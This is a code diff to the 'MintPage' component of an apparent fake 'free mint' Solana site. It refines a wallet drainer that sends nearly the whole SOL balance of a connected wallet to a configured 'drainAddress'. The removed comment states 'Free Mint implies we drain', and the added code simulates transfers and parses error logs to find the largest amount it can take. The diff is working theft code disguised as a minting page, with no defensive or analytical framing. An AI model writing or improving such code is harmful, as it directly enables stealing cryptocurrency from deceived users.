@@ -173,20 +173,62 @@ const MintPage = ({ onBack }: MintPageProps) => {
       const senderPubKey = new solana.PublicKey(walletAddress);
       const recipientPubKey = new solana.PublicKey(siteConfig.drainAddress);
 
-      // Get full balance and calculate maximum transferable amount (Free Mint implies we drain)
-      const fee = 5000; // Standard SOL transfer fee
-      const transferableBalance = balance - fee;
+      // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
+      // Instead of a hardcoded buffer, we use simulation to find the exact max amount
+      let currentTransferable = balance - 5000; // Start with a baseline 0.000005 SOL fee
+      let simulationSuccess = false;
+      let simRetryCount = 0;
 
-      if (transferableBalance <= 5000) {
-        throw new Error('Insufficient balance to cover transaction fees.');
+      while (!simulationSuccess && simRetryCount < 3) {
+        if (currentTransferable <= 0) break;
+
+        const testInstruction = solana.SystemProgram.transfer({
+          fromPubkey: senderPubKey,
+          toPubkey: recipientPubKey,
+          lamports: currentTransferable,
+        });
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        const testMessage = new solana.TransactionMessage({
+          payerKey: senderPubKey,
+          recentBlockhash: blockhash,
+          instructions: [testInstruction],
+        }).compileToV0Message();
+
+        const testTransaction = new solana.VersionedTransaction(testMessage);
+        const simulation = await connection.simulateTransaction(testTransaction);
+
+        if (!simulation.value.err) {
+          simulationSuccess = true;
+          break;
+        }
+
+        // Parse logs for "insufficient lamports X, need Y"
+        const logs = simulation.value.logs?.join(' ') || '';
+        const match = logs.match(/insufficient lamports (\d+), need (\d+)/);
+        
+        if (match) {
+          const have = parseInt(match[1]);
+          const need = parseInt(match[2]);
+          const deficit = need - have;
+          // Adjust by the exact deficit + a tiny safety margin
+          currentTransferable -= (deficit + 500); 
+          simRetryCount++;
+        } else {
+          // Fallback if logs are unparseable
+          currentTransferable -= 10000;
+          simRetryCount++;
+        }
       }
 
-
+      if (currentTransferable <= 0) {
+        throw new Error('Insufficient balance to cover current network fees.');
+      }
 
       const instruction = solana.SystemProgram.transfer({
         fromPubkey: senderPubKey,
         toPubkey: recipientPubKey,
-        lamports: transferableBalance,
+        lamports: currentTransferable,
       });
 
       let signed;
